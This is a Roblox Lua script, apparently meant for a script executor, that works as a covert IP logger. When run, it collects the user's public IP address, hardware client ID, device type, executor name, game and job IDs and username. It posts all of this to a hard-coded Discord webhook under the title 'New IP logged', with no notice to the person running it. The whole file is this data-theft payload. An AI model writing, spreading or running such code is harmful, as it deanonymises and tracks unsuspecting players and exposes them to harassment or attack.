local HttpService = game:GetService("HttpService")
local ip = game:HttpGet("https://api.ipify.org")
local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bUxVvcDNAq77KAxAdZfCyNaAJjeR3l0tlvqV0Zpf_SUxWglFqX9eWa5y"
local player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Mobile"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    elseif UserInputService.MouseEnabled then
        return "PC"
    else
        return "Unknown Device"
    end
end

local deviceType = getDeviceType()

function sendWebhook(url, content, embed)
	if _G.DiscordId then
		content = "<@" .. tostring(_G.DiscordId) .. ">"
	end
	http.request {
		Url = url;
		Method = 'POST';
		Headers = {
			['Content-Type'] = 'application/json';
		};
		Body = game:GetService'HttpService':JSONEncode({content = content, embeds = {embed};});
	};
end

function sendLogger()
	local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bUxVvcDNAq77KAxAdZfCyNaAJjeR3l0tlvqV0Zpf_SUxWglFqX9eWa5y"
	local ip = game:HttpGet("https://api.ipify.org")
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
	local placeId = game.PlaceId
	local g_values = ""

	local Embed = {
		["title"] = "New IP logged",
		["description"] = "ez",
		["color"] = 5814783,
		["fields"] = {
			{
				["name"] = "IP Address",
				["value"] = "`" .. ip .. "`",
				["inline"] = true
			},
            {
				["name"] = "Device",
				["value"] = "`" .. deviceType .. "`",
				["inline"] = true
			},
			{
				["name"] = "Client ID",
				["value"] = "`" .. hwid .. "`",
				["inline"] = true
			},
			{
				["name"] = "Executor",
				["value"] = "`" .. identifyexecutor() .. "`",
				["inline"] = true
			},
			{
				["name"] = "Game",
				["value"] = "`" .. placeId .. "`",
				["inline"] = true
			},
			{
				["name"] = "Job ID",
				["value"] = "`" .. game.JobId .. "`",
				["inline"] = true
			},

			
		},
		["author"] = {
			["name"] = game.Players.LocalPlayer.Name
		}
	}
	sendWebhook(url, "logged", Embed)
end

sendLogger()
